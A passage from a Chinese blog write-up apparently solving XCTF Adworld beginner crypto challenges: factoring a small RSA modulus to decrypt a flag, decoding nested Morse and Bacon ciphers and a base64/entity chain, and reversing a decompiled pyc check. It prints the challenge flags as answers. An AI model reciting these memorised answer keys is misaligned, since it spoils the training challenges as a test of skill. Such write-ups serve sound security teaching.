</p></blockquote><p>果然，解rsa都是需要工具的，看完官方wp后，发现只需要ctf-rsa-tools一行代码就能跑出flag来。</p><p>甚至连题目给的样例都是人家example里的（虽然是摘自PCTF。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python solve.py --verbose -k examples/jarvis_oj_mediumRSA/pubkey.pem --decrypt examples/jarvis_oj_mediumRSA/flag.enc</span><br></pre></td></tr></table></figure><p>不过在看wp时，发现有人给了另一种常规解法</p><p>他的解题思路解题思路是：①使用 openssl 解密.pem 中参数 –&gt; ②参数十六进制转换为十进制 –&gt; ③ 利用 factor 对大整数进行分解，得到 p 和 q  –&gt; ④用 rsatool 生成私钥文件: private.pem  –&gt; ⑤用 private.pem 解密 flag.enc </p><p>其中第三步factor用到的网站为：<a href="http://www.factordb.com/" target="_blank" rel="noopener">http://www.factordb.com/</a> </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1</span></span><br><span class="line"><span class="variable">$openssl</span> rsa -pubin -text -modulus -<span class="keyword">in</span> warmup -<span class="keyword">in</span> pubkey.pem</span><br><span class="line"><span class="comment">#2将得到的modulus用python进行转换</span></span><br><span class="line"><span class="variable">$python</span></span><br><span class="line">&gt;&gt;&gt; 0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD </span><br><span class="line">87924348264132406875276140514499937145050893665602592992418171647042491658461</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="comment">#3 进入网站 http://www.factordb.com/  将大整数分解为p，q</span></span><br><span class="line"><span class="comment">#p= 275127860351348928173285174381581152299 </span></span><br><span class="line"><span class="comment">#q= 319576316814478949870590164193048041239</span></span><br><span class="line"><span class="comment">#4 利用rsatool 生成私钥文件 private.pem</span></span><br><span class="line"><span class="variable">$python</span> rsatool.py -o private.pem -e 65537 -p XXX -q XXX</span><br><span class="line"><span class="comment">#5</span></span><br><span class="line"><span class="variable">$openssl</span> rsautl -decrypt -<span class="keyword">in</span> flag.enc -inkey private.pem</span><br></pre></td></tr></table></figure><h2 id="0x09-不仅仅是Morse"><a href="#0x09-不仅仅是Morse" class="headerlink" title="0x09 不仅仅是Morse"></a>0x09 不仅仅是Morse</h2><blockquote><p> 题目描述：“这个题目和我们刚刚做的那个好像啊但是为什么按照刚刚的方法做出来答案却不对呢” ，你奇怪的问了问小鱼，“可能是因为还有一些奇怪的加密方式在里面吧，我们在仔细观察观察”。两个人 安安静静的坐下来开始思考，很耐心的把自己可以想到的加密方式一种种的过了一遍，十多分钟后两个人 异口同声的说“我想到了！”。一种食物,格式为cyberpeace{小写的你解出的答案} </p></blockquote><p>题目附件给了一大串摩斯电码，按常理找一个网站解密了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--<span class="regexp">/.-/</span>-.--<span class="regexp">/..--.-/</span>-...<span class="regexp">/./</span>..--.-<span class="regexp">/..../</span>.-<span class="regexp">/...-/</span>.<span class="regexp">/..--.-/</span>.-<span class="regexp">/-./</span>---<span class="regexp">/-/</span>....<span class="regexp">/./</span>.-.<span class="regexp">/..--.-/</span>-..<span class="regexp">/./</span>-.-.<span class="regexp">/---/</span>-..<span class="regexp">/./</span>....<span class="regexp">/..../</span>....<span class="regexp">/..../</span>.-<span class="regexp">/.-/</span>.-<span class="regexp">/.-/</span>.-<span class="regexp">/-.../</span>.-<span class="regexp">/.-/</span>-...<span class="regexp">/-.../</span>-...<span class="regexp">/.-/</span>.-<span class="regexp">/-.../</span>-...<span class="regexp">/.-/</span>.-<span class="regexp">/.-/</span>.-<span class="regexp">/.-/</span>.-<span class="regexp">/.-/</span>.-<span class="regexp">/-.../</span>.-<span class="regexp">/.-/</span>-...<span class="regexp">/.-/</span>-...<span class="regexp">/.-/</span>.-<span class="regexp">/.-/</span>.-<span class="regexp">/.-/</span>.-<span class="regexp">/.-/</span>-...<span class="regexp">/-.../</span>.-<span class="regexp">/-.../</span>.-<span class="regexp">/.-/</span>.-<span class="regexp">/-.../</span>-...<span class="regexp">/.-/</span>.-<span class="regexp">/.-/</span>-...<span class="regexp">/-.../</span>.-<span class="regexp">/.-/</span>-...<span class="regexp">/.-/</span>.-<span class="regexp">/.-/</span>.-<span class="regexp">/-.../</span>.-<span class="regexp">/-.../</span>.-<span class="regexp">/.-/</span>-...<span class="regexp">/.-/</span>.-<span class="regexp">/.-/</span>-...<span class="regexp">/-.../</span>.-<span class="regexp">/-.../</span>.-<span class="regexp">/.-/</span>.-<span class="regexp">/-.../</span>.-<span class="regexp">/.-/</span>.-<span class="regexp">/-.../</span>.-<span class="regexp">/.-/</span>-...<span class="regexp">/.-/</span>-...<span class="regexp">/-.../</span>.-<span class="regexp">/.-/</span>-...<span class="regexp">/-.../</span>-...<span class="regexp">/.-/</span>-...<span class="regexp">/.-/</span>.-<span class="regexp">/.-/</span>-...<span class="regexp">/.-/</span>-...<span class="regexp">/.-/</span>-...<span class="regexp">/-.../</span>.-<span class="regexp">/.-/</span>.-<span class="regexp">/-.../</span>-...<span class="regexp">/.-/</span>-...<span class="regexp">/.-/</span>.-<span class="regexp">/.-/</span>-...<span class="regexp">/.-/</span>.-<span class="regexp">/-.../</span>.-<span class="regexp">/.-/</span>-...<span class="regexp">/.-/</span>.-<span class="regexp">/.-/</span>.-<span class="regexp">/-.../</span>-...<span class="regexp">/.-/</span>-...<span class="regexp">/-.../</span>.-<span class="regexp">/.-/</span>-...<span class="regexp">/-.../</span>.-<span class="regexp">/.-/</span>-...<span class="regexp">/.-/</span>.-<span class="regexp">/-.../</span>.-<span class="regexp">/.-/</span>.-<span class="regexp">/-.../</span>.-<span class="regexp">/.-/</span>-...<span class="regexp">/.-/</span>.-<span class="regexp">/-.../</span>.-<span class="regexp">/.-/</span>-...<span class="regexp">/.-/</span>-...<span class="regexp">/.-/</span>.-<span class="regexp">/-.../</span>-...<span class="regexp">/.-/</span>-...<span class="regexp">/.-/</span>.-<span class="regexp">/.-/</span>.-<span class="regexp">/-.../</span>-...<span class="regexp">/.-/</span>-...<span class="regexp">/.-/</span>.-<span class="regexp">/-.../</span>-...<span class="regexp">/.-</span></span><br></pre></td></tr></table></figure><p>摩斯电码解密网站： <a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" target="_blank" rel="noopener">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a> </p><p>解出来如下，明显嵌套了另外一种加密</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">MAY</span>.<span class="selector-class">.--</span><span class="selector-class">.-BE</span>.<span class="selector-class">.--</span><span class="selector-class">.-HAVE</span>.<span class="selector-class">.--</span><span class="selector-class">.-ANOTHER</span>.<span class="selector-class">.--</span><span class="selector-class">.-DECODEHHHHAAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA</span></span><br></pre></td></tr></table></figure><p>因为后面一串AB串，转摩斯翻译不出来，因为不晓得哪里分界，转为二进制也没有思路，百度得知这是培根密码</p><p>培根密码解密网站： <a href="http://rumkin.com/tools/cipher/baconian.php" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/baconian.php</a> </p><p>AB串解得<code>ATTACKANDDEFENCEWORLDISINTERESTING</code></p><p>记得小写。</p><h2 id="0x0a-混合编码"><a href="#0x0a-混合编码" class="headerlink" title="0x0a 混合编码"></a>0x0a 混合编码</h2><blockquote><p> 题目描述：经过了前面那么多题目的历练，耐心细致在解题当中是 必不可少的品质，刚巧你们都有，你和小鱼越来越入迷。那么走向了下一个题目，这个题目好长 好长，你知道你们只要细心细致，答案总会被你们做出来的，你们开始慢慢的尝试，慢慢的猜想 ，功夫不负有心人，在你们耐心的一步步的解答下，答案跃然纸上，你俩默契一笑，相视击掌 走向了下面的挑战。格式为cyberpeace{小写的你解出的答案} </p></blockquote><p>这题感觉没什么好说的，下载附件发现</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ji<span class="name">M3</span><span class="symbol">NjsmIzEyMjsmIzY5</span>OyYjMTIwOyYj<span class="symbol">Nzk7</span>Ji<span class="name">M4</span>MzsmIzU<span class="number">2</span>OyYjMTIwOyYj<span class="symbol">Nzc7</span>Ji<span class="name">M2</span>ODsmIzY<span class="number">5</span>OyYjMTE<span class="number">4</span>OyYj<span class="symbol">Nzc7</span>Ji<span class="name">M4</span><span class="symbol">NDsmIzY1</span>OyYj<span class="symbol">NTI7</span>Ji<span class="name">M3</span><span class="symbol">NjsmIzEyMjsmIzEwNzsmIzUzOyYjNzY7</span>JiMxMjI<span class="number">7</span>Ji<span class="name">M2</span>OTsmIzEyMDsmIzc<span class="number">3</span>OyYjOD<span class="name">M7</span>Ji<span class="name">M1</span><span class="symbol">NjsmIzEyMDsmIzc3</span>OyYj<span class="symbol">Njg7</span>JiMxMDc<span class="number">7</span>JiMxMT<span class="name">g7</span>Ji<span class="name">M3</span><span class="symbol">NzsmIzg0</span>OyYj<span class="symbol">NjU7</span>JiMxMjA<span class="number">7</span>Ji<span class="name">M3</span><span class="symbol">NjsmIzEyMjsmIzY5</span>OyYjMTIwOyYj<span class="symbol">Nzg7</span>JiMxMDU<span class="number">7</span>Ji<span class="name">M1</span><span class="symbol">NjsmIzEyMDsmIzc3</span>OyYjODQ<span class="number">7</span>Ji<span class="name">M2</span>OTsmIzExODsmIzc<span class="number">5</span>OyYjODQ<span class="number">7</span>Ji<span class="name">M5</span>OTsmIzExODsmIzc<span class="number">3</span>OyYjODQ<span class="number">7</span>Ji<span class="name">M2</span>OTsmIzUwOyYj<span class="symbol">NzY7</span>JiMxMjI<span class="number">7</span>Ji<span class="name">M2</span>OTsmIzEyMDsmIzc<span class="number">4</span>OyYjMTA<span class="number">1</span>OyYj<span class="symbol">NTY7</span>Ji<span class="name">M1</span>MzsmIzc<span class="number">4</span>OyYjMTIxOyYj<span class="symbol">NTY7</span>Ji<span class="name">M1</span>MzsmIzc<span class="number">5</span>OyYjOD<span class="name">M7</span>Ji<span class="name">M1</span><span class="symbol">NjsmIzEyMDsmIzc3</span>OyYj<span class="symbol">Njg7</span>Ji<span class="name">M5</span>OTsmIzExODsmIzc<span class="number">5</span>OyYjODQ<span class="number">7</span>Ji<span class="name">M5</span>OTsmIzExODsmIzc<span class="number">3</span>OyYjODQ<span class="number">7</span>Ji<span class="name">M2</span>OTsmIzExOTsmIzc<span class="number">2</span>OyYjMTIyOyYj<span class="symbol">Njk7</span>JiMxMTk<span class="number">7</span>Ji<span class="name">M3</span><span class="symbol">NzsmIzY3</span>OyYj<span class="symbol">NTY7</span>JiMxMjA<span class="number">7</span>Ji<span class="name">M3</span><span class="symbol">NzsmIzY4</span>OyYj<span class="symbol">NjU7</span>JiMxMT<span class="name">g7</span>Ji<span class="name">M3</span><span class="symbol">NzsmIzg0</span>OyYj<span class="symbol">NjU7</span>JiMxMjA<span class="number">7</span>Ji<span class="name">M3</span><span class="symbol">NjsmIzEyMjsmIzY5</span>OyYjMTE<span class="number">5</span>OyYj<span class="symbol">Nzc7</span>JiMxMDU<span class="number">7</span>Ji<span class="name">M1</span><span class="symbol">NjsmIzEyMDsmIzc3</span>OyYj<span class="symbol">Njg7</span>Ji<span class="name">M2</span>OTsmIzExODsmIzc<span class="number">3</span>OyYjODQ<span class="number">7</span>Ji<span class="name">M2</span>OTsmIzExOTsmIzc<span class="number">2</span>OyYjMTIyOyYjMTA<span class="number">3</span>OyYj<span class="symbol">NTM7</span>Ji<span class="name">M3</span><span class="symbol">NjsmIzEyMjsmIzY5</span>OyYjMTE<span class="number">5</span>OyYj<span class="symbol">Nzc7</span>Ji<span class="name">M4</span>MzsmIzU<span class="number">2</span>OyYjMTIwOyYj<span class="symbol">Nzc7</span>Ji<span class="name">M4</span><span class="symbol">NDsmIzEwNzsmIzExODsmIzc3</span>OyYjODQ<span class="number">7</span>Ji<span class="name">M2</span>OTsmIzEyMDsmIzc<span class="number">2</span>OyYjMTIyOyYj<span class="symbol">Njk7</span>JiMxMjA<span class="number">7</span>Ji<span class="name">M3</span>ODsmIzY<span class="number">3</span>OyYj<span class="symbol">NTY7</span>JiMxMjA<span class="number">7</span>Ji<span class="name">M3</span><span class="symbol">NzsmIzY4</span>OyYjMTAzOyYjMTE<span class="number">4</span>OyYj<span class="symbol">Nzc7</span>Ji<span class="name">M4</span><span class="symbol">NDsmIzY1</span>OyYjMTE<span class="number">5</span>Ow==</span><br></pre></td></tr></table></figure><p>明显的base64编码，解base64得到如下：</p><figure class="highlight cal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;<span class="string">#76</span>;&amp;<span class="string">#122</span>;&amp;<span class="string">#69</span>;&amp;<span class="string">#120</span>;&amp;<span class="string">#79</span>;&amp;<span class="string">#83</span>;&amp;<span class="string">#56</span>;&amp;<span class="string">#120</span>;&amp;<span class="string">#77</span>;&amp;<span class="string">#68</span>;&amp;<span class="string">#69</span>;&amp;<span class="string">#118</span>;&amp;<span class="string">#77</span>;&amp;<span class="string">#84</span>;&amp;<span class="string">#65</span>;&amp;<span class="string">#52</span>;&amp;<span class="string">#76</span>;&amp;<span class="string">#122</span>;&amp;<span class="string">#107</span>;&amp;<span class="string">#53</span>;&amp;<span class="string">#76</span>;&amp;<span class="string">#122</span>;&amp;<span class="string">#69</span>;&amp;<span class="string">#120</span>;&amp;<span class="string">#77</span>;&amp;<span class="string">#83</span>;&amp;<span class="string">#56</span>;&amp;<span class="string">#120</span>;&amp;<span class="string">#77</span>;&amp;<span class="string">#68</span>;&amp;<span class="string">#107</span>;&amp;<span class="string">#118</span>;&amp;<span class="string">#77</span>;&amp;<span class="string">#84</span>;&amp;<span class="string">#65</span>;&amp;<span class="string">#120</span>;&amp;<span class="string">#76</span>;&amp;<span class="string">#122</span>;&amp;<span class="string">#69</span>;&amp;<span class="string">#120</span>;&amp;<span class="string">#78</span>;&amp;<span class="string">#105</span>;&amp;<span class="string">#56</span>;&amp;<span class="string">#120</span>;&amp;<span class="string">#77</span>;&amp;<span class="string">#84</span>;&amp;<span class="string">#69</span>;&amp;<span class="string">#118</span>;&amp;<span class="string">#79</span>;&amp;<span class="string">#84</span>;&amp;<span class="string">#99</span>;&amp;<span class="string">#118</span>;&amp;<span class="string">#77</span>;&amp;<span class="string">#84</span>;&amp;<span class="string">#69</span>;&amp;<span class="string">#50</span>;&amp;<span class="string">#76</span>;&amp;<span class="string">#122</span>;&amp;<span class="string">#69</span>;&amp;<span class="string">#120</span>;&amp;<span class="string">#78</span>;&amp;<span class="string">#105</span>;&amp;<span class="string">#56</span>;&amp;<span class="string">#53</span>;&amp;<span class="string">#78</span>;&amp;<span class="string">#121</span>;&amp;<span class="string">#56</span>;&amp;<span class="string">#53</span>;&amp;<span class="string">#79</span>;&amp;<span class="string">#83</span>;&amp;<span class="string">#56</span>;&amp;<span class="string">#120</span>;&amp;<span class="string">#77</span>;&amp;<span class="string">#68</span>;&amp;<span class="string">#99</span>;&amp;<span class="string">#118</span>;&amp;<span class="string">#79</span>;&amp;<span class="string">#84</span>;&amp;<span class="string">#99</span>;&amp;<span class="string">#118</span>;&amp;<span class="string">#77</span>;&amp;<span class="string">#84</span>;&amp;<span class="string">#69</span>;&amp;<span class="string">#119</span>;&amp;<span class="string">#76</span>;&amp;<span class="string">#122</span>;&amp;<span class="string">#69</span>;&amp;<span class="string">#119</span>;&amp;<span class="string">#77</span>;&amp;<span class="string">#67</span>;&amp;<span class="string">#56</span>;&amp;<span class="string">#120</span>;&amp;<span class="string">#77</span>;&amp;<span class="string">#68</span>;&amp;<span class="string">#65</span>;&amp;<span class="string">#118</span>;&amp;<span class="string">#77</span>;&amp;<span class="string">#84</span>;&amp;<span class="string">#65</span>;&amp;<span class="string">#120</span>;&amp;<span class="string">#76</span>;&amp;<span class="string">#122</span>;&amp;<span class="string">#69</span>;&amp;<span class="string">#119</span>;&amp;<span class="string">#77</span>;&amp;<span class="string">#105</span>;&amp;<span class="string">#56</span>;&amp;<span class="string">#120</span>;&amp;<span class="string">#77</span>;&amp;<span class="string">#68</span>;&amp;<span class="string">#69</span>;&amp;<span class="string">#118</span>;&amp;<span class="string">#77</span>;&amp;<span class="string">#84</span>;&amp;<span class="string">#69</span>;&amp;<span class="string">#119</span>;&amp;<span class="string">#76</span>;&amp;<span class="string">#122</span>;&amp;<span class="string">#107</span>;&amp;<span class="string">#53</span>;&amp;<span class="string">#76</span>;&amp;<span class="string">#122</span>;&amp;<span class="string">#69</span>;&amp;<span class="string">#119</span>;&amp;<span class="string">#77</span>;&amp;<span class="string">#83</span>;&amp;<span class="string">#56</span>;&amp;<span class="string">#120</span>;&amp;<span class="string">#77</span>;&amp;<span class="string">#84</span>;&amp;<span class="string">#107</span>;&amp;<span class="string">#118</span>;&amp;<span class="string">#77</span>;&amp;<span class="string">#84</span>;&amp;<span class="string">#69</span>;&amp;<span class="string">#120</span>;&amp;<span class="string">#76</span>;&amp;<span class="string">#122</span>;&amp;<span class="string">#69</span>;&amp;<span class="string">#120</span>;&amp;<span class="string">#78</span>;&amp;<span class="string">#67</span>;&amp;<span class="string">#56</span>;&amp;<span class="string">#120</span>;&amp;<span class="string">#77</span>;&amp;<span class="string">#68</span>;&amp;<span class="string">#103</span>;&amp;<span class="string">#118</span>;&amp;<span class="string">#77</span>;&amp;<span class="string">#84</span>;&amp;<span class="string">#65</span>;&amp;<span class="string">#119</span>;</span><br></pre></td></tr></table></figure><p>明显的unicode编码，解码得到如下</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LzExOS<span class="number">8</span>xMDEvMTA<span class="number">4</span>Lzk<span class="number">5</span>LzExMS<span class="number">8</span>xMDkvMTAxLzEx<span class="symbol">Ni8</span>xMTEvOTcvMTE<span class="number">2</span>LzEx<span class="symbol">Ni85</span><span class="symbol">Ny85</span>OS<span class="number">8</span>xMDcvOTcvMTEwLzEwMC<span class="number">8</span>xMDAvMTAxLzEwMi<span class="number">8</span>xMDEvMTEwLzk<span class="number">5</span>LzEwMS<span class="number">8</span>xMTkvMTExLzEx<span class="symbol">NC8</span>xMDgvMTAw</span><br></pre></td></tr></table></figure><p>没有明显特征，解一波base64得到如下</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="number">119</span>/<span class="number">101</span>/<span class="number">108</span>/<span class="number">99</span>/<span class="number">111</span>/<span class="number">109</span>/<span class="number">101</span>/<span class="number">116</span>/<span class="number">111</span>/<span class="number">97</span>/<span class="number">116</span>/<span class="number">116</span>/<span class="number">97</span>/<span class="number">99</span>/<span class="number">107</span>/<span class="number">97</span>/<span class="number">110</span>/<span class="number">100</span>/<span class="number">100</span>/<span class="number">101</span>/<span class="number">102</span>/<span class="number">101</span>/<span class="number">110</span>/<span class="number">99</span>/<span class="number">101</span>/<span class="number">119</span>/<span class="number">111</span>/<span class="number">114</span>/<span class="number">108</span>/<span class="number">100</span></span><br></pre></td></tr></table></figure><p>盲猜Ascii吗</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">'/119/101/108/99/111/109/101/116/111/97/116/116/97/99/107/97/110/100/100/101/102/101/110/99/101/119/111/114/108/100'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l = a.split(<span class="string">'/'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">''</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):<span class="comment">#从i+1开始因为/的原因，l[0] = ''</span></span><br><span class="line"><span class="meta">... </span>    s += chr(int(l[i+<span class="number">1</span>]))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line"><span class="string">'welcometoattackanddefenceworld'</span></span><br></pre></td></tr></table></figure><p>得到flag：<code>cyberpeace{welcometoattackanddefenceworld}</code></p><h2 id="0x0b-easychallenge"><a href="#0x0b-easychallenge" class="headerlink" title="0x0b easychallenge"></a>0x0b easychallenge</h2><blockquote><p> 题目描述：你们走到了一个冷冷清清的谜题前面，小鱼看着题目给的信息束手无策，丈二和尚摸不着头脑 ，你嘿嘿一笑，拿出来了你随身带着的笔记本电脑，噼里啪啦的敲起来了键盘，清晰的函数逻辑和流程出现在 了电脑屏幕上，你敲敲键盘，更改了几处地方，运行以后答案变出现在了电脑屏幕上。 </p></blockquote><p>下载附件发现是一个pyc文件，明显是一个已经编译的python文件</p><p>百度搜反编译pyc，找到一个在线反编译网站 <a href="https://tool.lu/pyc/" target="_blank" rel="noopener">https://tool.lu/pyc/</a> </p><p>反编译得到源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="comment"># 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pyc</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode1</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i) ^ <span class="number">36</span></span><br><span class="line">        x = x + <span class="number">25</span></span><br><span class="line">        s += chr(x)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode2</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i) + <span class="number">36</span></span><br><span class="line">        x = x ^ <span class="number">36</span></span><br><span class="line">        s += chr(x)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode3</span><span class="params">(ans)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> base64.b32encode(ans)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">' '</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Please Input your flag:'</span></span><br><span class="line">flag = raw_input()</span><br><span class="line">final = <span class="string">'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='</span></span><br><span class="line"><span class="keyword">if</span> encode3(encode2(encode1(flag))) == final:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'correct'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'wrong'</span></span><br></pre></td></tr></table></figure><p>易知chr和ord为反函数、<code>x^a^a=x</code>、<code>base64.b32decode()</code>和<code>base64.b32encode()</code>互为反函数</p><p>因此写一个python脚本即可得出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>final = <span class="string">'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = base64.b32decode(final)<span class="comment">#decode3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="string">b'\xa0\xbe\xa7Z\xb7\xb5Z\xa6\xa0Z\xb8\xae\xa3\xa9Z\xb7Z\xb0\xa9\xae\xa3\xa4\xad\xad\xad\xad\xad\xb2'</span></span><br><span class="line"><span class="comment">#注意要将a的字节流转换</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="string">"\xa0\xbe\xa7Z\xb7\xb5Z\xa6\xa0Z\xb8\xae\xa3\xa9Z\xb7Z\xb0\xa9\xae\xa3\xa4\xad\xad\xad\xad\xad\xb2"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">''</span><span class="comment">#decode2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line"><span class="meta">... </span>    s += chr((ord(i)^<span class="number">36</span>)<span class="number">-36</span>)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line"><span class="string">'`v_ZomZ^`ZxfciZoZpifc\\eeeeer'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l = <span class="string">''</span><span class="comment">#decode1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line"><span class="meta">... </span>    l+= chr((ord(i)<span class="number">-25</span>)^<span class="number">36</span>)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l</span><br><span class="line"><span class="string">'cyberpeace&#123;interestinghhhhh&#125;'</span></span><br></pre></td></tr></table></figure><p>PS：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">编译python文件为.pyc文件</span></span><br><span class="line"><span class="meta">$</span><span class="bash">python -m compileall main.py</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">pyc的反编译</span></span><br><span class="line"><span class="meta">#</span><span class="bash">依赖python的uncompyle</span></span><br><span class="line"><span class="meta">$</span><span class="bash">pip install uncompyle</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">查看帮助</span></span><br><span class="line"><span class="meta">$</span><span class="bash">uncompyle6 --<span class="built_in">help</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">将models.pyc反编译成models.py</span></span><br><span class="line"><span class="meta">$</span><span class="bash">uncompyle6 models.pyc &gt; models.py</span></span><br></pre></td></tr></table></figure><p>利用uncompyle6反编译的pyc文件和在线编译文件相同，也挺快的</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-crypto-wp\11_1.jpg" alt></p><h2 id="0x0c-easy-ECC"><a href="#0x0c-easy-ECC" class="headerlink" title="0x0c easy_ECC"></a>0x0c easy_ECC</h2><blockquote><p> 题目描述：转眼两个人又走到了下一个谜题的地方，这又是一种经典的密码学加密方式 而你刚好没有这个的工具，你对小鱼说“小鱼我知道数学真的很重要了，有了工具只是方便我们使用 懂了原理才能做到，小鱼你教我一下这个缇努怎么做吧！”在小鱼的一步步带领下，你终于明白了ECC 的基本原理，成功的解开了这个题目，两个人相视一笑，快步走向了下一个题目所在的位置。flag格式为cyberpeace{x+y的值} </p></blockquote><p>由题目可知：这是ECC加密</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">已知椭圆曲线加密Ep(<span 